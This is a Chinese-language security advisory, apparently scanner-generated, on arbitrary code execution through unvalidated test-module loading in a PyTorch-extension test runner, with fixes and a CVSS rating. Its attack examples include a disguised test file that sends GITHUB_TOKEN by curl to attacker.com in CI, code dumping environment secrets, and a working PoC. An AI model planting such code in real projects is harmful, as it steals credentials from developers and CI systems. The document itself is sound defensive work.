# VULN-005: Unsafe Module Loading - Arbitrary Code Execution

## 漏洞概述

| 属性 | 值 |
|------|-----|
| **漏洞ID** | VULN-005 |
| **CWE** | CWE-669: Incorrect Resource Transfer Between Spheres |
| **严重性** | HIGH (原定: medium, 建议升级) |
| **置信度** | 95% |
| **状态** | CONFIRMED - 真实漏洞 |
| **文件** | scripts/torch_extension/torch_extension_ut_runner.py |
| **行号** | 40-48 (核心), 58-67 (数据流入口) |
| **函数** | load_tests_from_file, main |

## 漏洞详情

### 受影响代码

```python
# 文件: scripts/torch_extension/torch_extension_ut_runner.py
# 行号: 40-48

def load_tests_from_file(test_file):
    """从单个文件加载测试"""
    module_name = test_file.stem
    spec = importlib.util.spec_from_file_location(module_name, test_file)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)  # <-- 任意代码执行点

    loader = unittest.TestLoader()
    return loader.loadTestsFromModule(module)

# 数据流入口 (行号: 51-67)
def main():
    setup_logging()
    if len(sys.argv) != 2:
        logging.error("Usage: python3 torch_extension_ut_runner.py task.yaml")
        sys.exit(1)

    # 加载YAML配置 - 无路径验证
    with open(sys.argv[1], 'r') as f:
        test_dirs = yaml.safe_load(f)['test_dirs']

    # 收集所有测试文件 - 无目录验证
    test_files = []
    for test_dir in test_dirs:
        test_dir_path = Path(test_dir)
        if test_dir_path.exists():
            # 查找所有 test_*.py 文件 - 无文件验证
            test_files.extend(test_dir_path.glob('test_*.py'))
```

### 完整数据流

```
sys.argv[1] 
    │
    ▼
open(YAML_file) ──────────────────────┐
    │                                  │ 攻击面1: 控制YAML文件路径
    ▼                                  │
yaml.safe_load() ─────────────────────┤
    │                                  │ yaml.safe_load 防止YAML反序列化攻击
    ▼                                  │ 但不防止后续的模块加载攻击
test_dirs (list of paths) ────────────┤
    │                                  │
    ▼                                  │
Path(test_dir).glob("test_*.py") ─────┤ 攻击面2: 在扫描目录放置恶意文件
    │                                  │
    ▼                                  │
importlib.util.spec_from_file_location┤
    │                                  │
    ▼                                  │
module_from_spec ──────────────────────┤
    │                                  │
    ▼                                  │
spec.loader.exec_module(module) ───────┘ ⚠️ 任意代码执行
```

## 攻击向量分析

### 攻击向量 1: 控制 YAML 文件路径

**前提条件**: 攻击者能够控制 `sys.argv[1]` (命令行参数)

**攻击步骤**:
1. 创建恶意 YAML 文件:
   ```yaml
   # /tmp/malicious_task.yaml
   test_dirs:
     - /tmp/malicious_tests
   ```

2. 在指定目录创建恶意测试文件:
   ```python
   # /tmp/malicious_tests/test_pwned.py
   import os
   import subprocess
   
   # 任意代码执行
   subprocess.run(['/bin/bash', '-c', 'id > /tmp/pwned'])
   
   # 可选: 窃取环境变量中的密钥
   with open('/tmp/secrets.txt', 'w') as f:
       for k, v in os.environ.items():
           f.write(f'{k}={v}\n')
   ```

3. 触发漏洞:
   ```bash
   python3 torch_extension_ut_runner.py /tmp/malicious_task.yaml
   ```

**攻击复杂度**: LOW

### 攻击向量 2: 供应链攻击 - 恶意测试文件注入

**前提条件**: 攻击者能够向代码库提交代码

**攻击步骤**:
1. 在合法测试目录中添加恶意文件:
   ```python
   # math/abs/tests/ut/torch_extension/test_abs_malicious.py
   # 外观像正常测试文件
   
   import unittest
   import os
   
   # 模块级代码在导入时立即执行
   if os.environ.get('CI'):
       # 在CI环境中执行恶意操作
       import socket
       import subprocess
       
       # 反弹shell或数据外泄
       subprocess.Popen(['curl', 'https://attacker.com/exfil', 
                        '-d', os.environ.get('GITHUB_TOKEN', '')])
   
   class TestAbs(unittest.TestCase):
       def test_normal(self):
           # 包含正常测试以避免怀疑
           self.assertTrue(True)
   ```

2. 等待 CI/CD 流水线执行测试

**攻击复杂度**: LOW-MEDIUM (需要代码合并权限)

### 攻击向量 3: 路径遍历

**前提条件**: YAML 文件中指定相对路径或符号链接

**攻击步骤**:
1. 创建符号链接指向敏感系统目录:
   ```bash
   ln -s /etc test_etc
   ```

2. 如果 `/etc` 包含 `test_*.py` 文件，将被加载执行

**攻击复杂度**: MEDIUM (受系统目录结构限制)

## 实际影响评估

### 影响范围

| 维度 | 影响 |
|------|------|
| **机密性** | HIGH - 可读取环境变量、密钥、源代码 |
| **完整性** | HIGH - 可修改任意文件、注入后门 |
| **可用性** | HIGH - 可删除文件、破坏系统 |

### CI/CD 环境中的特殊风险

1. **密钥泄露**: CI/CD 环境通常包含敏感凭据
   - `GITHUB_TOKEN`
   - `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY`
   - `DOCKER_PASSWORD`
   - 自定义部署密钥

2. **供应链攻击**: 
   - 可修改构建产物
   - 可注入恶意代码到发布包
   - 可横向移动到其他系统

3. **持久化**: 
   - 可在构建服务器植入后门
   - 可修改源代码

### 现有缓解措施评估

| 措施 | 状态 | 有效性 |
|------|------|--------|
| yaml.safe_load() | 已实施 | ⚠️ 仅防止YAML反序列化，不防止模块加载攻击 |
| 文件路径验证 | 未实施 | ❌ 无效 |
| 目录白名单 | 未实施 | ❌ 无效 |
| 代码签名验证 | 未实施 | ❌ 无效 |
| 沙箱隔离 | 未实施 | ❌ 无效 |

## 攻击复杂度评估

| 因素 | 评分 | 说明 |
|------|------|------|
| 前提条件 | 低 | 仅需控制YAML路径或写入测试目录 |
| 技术难度 | 低 | 无需特殊技术，标准Python即可 |
| 检测难度 | 中 | 恶意代码可隐藏在看似正常的测试文件中 |
| 利用工具 | 低 | 无需特殊工具 |

**总体复杂度**: LOW

## 修复建议

### 短期缓解 (紧急)

```python
import os
import hashlib
from pathlib import Path

# 白名单验证
ALLOWED_TEST_ROOTS = [
    Path(__file__).parent.parent.parent,  # ops-math根目录
    # 其他预批准的目录
]

def validate_path(file_path: Path) -> bool:
    """验证文件路径是否在允许的目录内"""
    try:
        file_path.resolve()
    except (OSError, RuntimeError):
        return False
    
    for allowed_root in ALLOWED_TEST_ROOTS:
        try:
            file_path.resolve().relative_to(allowed_root.resolve())
            return True
        except ValueError:
            continue
    return False

def load_tests_from_file(test_file):
    """从单个文件加载测试 (带验证)"""
    test_file = Path(test_file).resolve()
    
    # 路径验证
    if not validate_path(test_file):
        raise ValueError(f"Test file path not in allowed directories: {test_file}")
    
    # 文件名模式验证
    if not test_file.name.startswith('test_') or not test_file.suffix == '.py':
        raise ValueError(f"Invalid test file name: {test_file}")
    
    # 可选: 文件完整性验证
    # expected_hash = get_expected_hash(test_file)
    # actual_hash = compute_file_hash(test_file)
    # if actual_hash != expected_hash:
    #     raise ValueError(f"Test file integrity check failed: {test_file}")
    
    module_name = test_file.stem
    spec = importlib.util.spec_from_file_location(module_name, test_file)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    
    loader = unittest.TestLoader()
    return loader.loadTestsFromModule(module)
```

### 中期改进

1. **实施目录白名单**:
   ```python
   # 在配置文件中定义允许的测试目录
   ALLOWED_TEST_DIRS = {
       '/path/to/ops-math/math/*/tests/ut/torch_extension',
       '/path/to/ops-math/conversion/*/tests/ut/torch_extension',
   }
   ```

2. **添加 YAML 路径验证**:
   ```python
   import os
   
   def validate_yaml_path(yaml_path: str) -> Path:
       path = Path(yaml_path).resolve()
       
       # 检查是否在允许的目录内
       allowed_yaml_roots = [
           Path(__file__).parent,  # 脚本所在目录
           Path.cwd(),  # 当前工作目录
       ]
       
       for root in allowed_yaml_roots:
           try:
               path.relative_to(root.resolve())
               return path
           except ValueError:
               continue
       
       raise ValueError(f"YAML path not allowed: {yaml_path}")
   ```

3. **添加日志审计**:
   ```python
   import logging
   
   def main():
       setup_logging()
       if len(sys.argv) != 2:
           logging.error("Usage: python3 torch_extension_ut_runner.py task.yaml")
           sys.exit(1)
       
       yaml_path = Path(sys.argv[1]).resolve()
       logging.info(f"Loading test configuration from: {yaml_path}")
       
       # 记录所有加载的模块
       with open(yaml_path, 'r') as f:
           test_dirs = yaml.safe_load(f)['test_dirs']
           logging.info(f"Test directories: {test_dirs}")
   ```

### 长期方案

1. **沙箱执行**: 使用容器或沙箱环境运行测试
2. **代码签名**: 对测试文件实施签名验证
3. **最小权限原则**: 以非特权用户运行测试
4. **网络隔离**: 限制测试环境的网络访问
5. **文件完整性监控**: 使用 AIDE 或类似工具监控测试目录

## 验证方法

### PoC (概念验证)

```python
#!/usr/bin/env python3
"""
VULN-005 PoC: 演示不安全模块加载漏洞
仅用于安全测试，请勿用于恶意目的
"""

import os
import tempfile
import subprocess
import sys

def create_malicious_test():
    """创建恶意测试文件"""
    malicious_code = '''
import os
import socket

# 在模块加载时立即执行
with open("/tmp/vuln005_pwned.txt", "w") as f:
    f.write("VULN-005 PoC executed successfully!\\n")
    f.write(f"User: {os.environ.get('USER', 'unknown')}\\n")
    f.write(f"CWD: {os.getcwd()}\\n")

# 尝试读取敏感环境变量
secrets = []
for key in ['GITHUB_TOKEN', 'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 
            'DOCKER_PASSWORD', 'KUBECONFIG']:
    if key in os.environ:
        secrets.append(f"{key}={os.environ[key][:10]}...")

if secrets:
    with open("/tmp/vuln005_secrets.txt", "w") as f:
        f.write("\\n".join(secrets))

class TestMalicious(unittest.TestCase):
    def test_nothing(self):
        self.assertTrue(True)
'''
    return malicious_code

def create_malicious_yaml(test_dir):
    """创建恶意YAML配置"""
    return f"test_dirs:\n  - {test_dir}\n"

def main():
    print("[*] VULN-005 PoC: Unsafe Module Loading")
    print("[*] 创建临时测试目录...")
    
    with tempfile.TemporaryDirectory() as tmpdir:
        test_dir = os.path.join(tmpdir, "tests")
        os.makedirs(test_dir)
        
        # 创建恶意测试文件
        test_file = os.path.join(test_dir, "test_malicious.py")
        with open(test_file, 'w') as f:
            f.write("import unittest\n")
            f.write(create_malicious_test())
        
        # 创建恶意YAML
        yaml_file = os.path.join(tmpdir, "task.yaml")
        with open(yaml_file, 'w') as f:
            f.write(create_malicious_yaml(test_dir))
        
        print(f"[*] 恶意测试文件: {test_file}")
        print(f"[*] 恶意YAML文件: {yaml_file}")
        print("[*] 执行测试运行器...")
        
        # 执行测试运行器
        runner_path = "scripts/torch_extension/torch_extension_ut_runner.py"
        result = subprocess.run(
            [sys.executable, runner_path, yaml_file],
            capture_output=True,
            text=True
        )
        
        print("[*] 检查漏洞触发...")
        if os.path.exists("/tmp/vuln005_pwned.txt"):
            print("[!] VULNERABILITY CONFIRMED: 恶意代码已执行!")
            with open("/tmp/vuln005_pwned.txt", 'r') as f:
                print(f"[!] {f.read()}")
        else:
            print("[*] 漏洞未触发 (可能需要适当的执行环境)")

if __name__ == "__main__":
    main()
```

### 手动验证步骤

```bash
# 1. 创建测试环境
mkdir -p /tmp/vuln_test
cd /tmp/vuln_test

# 2. 创建恶意测试文件
cat > test_pwned.py << 'PYEOF'
import os
with open('/tmp/vuln005_proof.txt', 'w') as f:
    f.write(f"VULN-005: Arbitrary code executed as {os.environ.get('USER', 'unknown')}\n")
PYEOF

# 3. 创建恶意YAML
cat > malicious.yaml << 'YAMLEOF'
test_dirs:
  - /tmp/vuln_test
YAMLEOF

# 4. 执行测试运行器
cd /path/to/ops-math
python3 scripts/torch_extension/torch_extension_ut_runner.py /tmp/vuln_test/malicious.yaml

# 5. 检查结果
cat /tmp/vuln005_proof.txt
# 预期输出: VULN-005: Arbitrary code executed as <username>
```

## 结论

### 漏洞判定: **真实漏洞** ✓

**理由**:
1. 存在明确的攻击路径 (YAML路径控制 → 模块加载 → 代码执行)
2. 攻击复杂度低，无需特殊技术
3. 影响严重 (任意代码执行)
4. 无有效缓解措施
5. CI/CD 环境中影响放大

### 严重性评估

| 维度 | CVSS 3.1 评分 |
|------|---------------|
| 攻击向量 (AV) | Local (L) |
| 攻击复杂度 (AC) | Low (L) |
| 所需权限 (PR) | Low (L) |
| 用户交互 (UI) | None (N) |
| 影响范围 (S) | Changed (C) |
| 机密性影响 (C) | High (H) |
| 完整性影响 (I) | High (H) |
| 可用性影响 (A) | High (H) |

**CVSS 3.1 基础分数**: 8.8 (HIGH)
**向量字符串**: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

### 建议优先级: **高优先级**

此漏洞应立即修复，特别是在 CI/CD 环境中使用此脚本的情况下。

---

*分析时间: 2026-04-21*
*分析工具: OpenCode Vulnerability Scanner*
